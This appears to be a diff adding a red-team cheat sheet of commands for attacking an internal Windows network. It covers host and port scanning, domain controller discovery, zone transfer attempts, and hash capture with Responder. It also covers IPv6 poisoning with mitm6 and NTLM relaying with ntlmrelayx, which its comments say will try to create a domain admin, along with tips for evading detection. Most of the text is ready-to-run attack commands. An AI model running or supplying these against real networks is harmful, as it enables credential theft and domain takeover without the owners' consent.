@@ -1,1 +1,39 @@
+==========================
+FIND HOSTS
+==========================
+>>$ nmap -p135,139,445,22,80 -T4 -Pn -n --max-retries=1 --max-rtt-timeout=500ms -vvv -iL scope.txt -oA online-hosts
+>>$ masscan -p22,80,135,139,445 10.0.0.0/8 --mine-rate 10000 --max-rate 15000 -oG masscan
+>>$ cme smb scope.txt 
+#### try other protocols, don't scan more than 1k at a time
+
+
+==========================
+SCAN HOSTS
+==========================
+>>$ nmap -p- -A -T4 --min-rate=10000 --max-rate=25000 --reason -Pn -iL ips.txt -oA allports
+
+# Find DCs
+>>$ nslookup domain.com
+>>$ nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com
+#### Try to zone transfer
+>>$ dig @dc-ip domain.com -t AXFR
+
+
+==========================
+LISTEN FOR HASHES
+==========================
+>>$ responder -I eth0 -Fwb
+
+#### you can change challenge in responder.conf to simple (1122334455667788) but it is more easily detectable due to numerous hosts having the same challenge (not normal).
+#### downgrade to NTLMv1 --lm
+
+		OR
+
+>>$ mitm6 -d domain.com
+	+
+>>$ ntlmrelayx -6 -t dc-ip -l loot -of hashes
+#### this has a lot of functionality, but default will attempt to create a domain admin.
+#### https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+
+
 
